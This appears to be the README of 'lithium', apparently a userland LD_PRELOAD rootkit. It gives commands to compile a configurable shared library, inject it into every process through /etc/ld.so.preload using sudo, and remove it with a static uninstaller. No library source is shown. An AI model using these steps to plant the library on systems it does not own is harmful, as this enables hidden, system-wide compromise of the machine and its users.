# Lithium

Clone repository
```
git clone https://github.com/carls0n/lithium
```
Move to lithium directory
```
cd lithium
```

Open lithium.c and customize configuration<br><br>
Next, compile lithium.
```
gcc -fPIC -shared -o lithium.so lithium.c -ldl
```
Move shared library
```
sudo cp lithium.so /usr/local/lib/
```
And finally, install
```
echo /usr/local/lib/lithium.so | sudo tee /etc/ld.so.preload
```

To uninstall
```
gcc -static -o lithium-uninstall lithium-uninstall.c
```
Uninstall
```
sudo ./lithium-uninstall
```
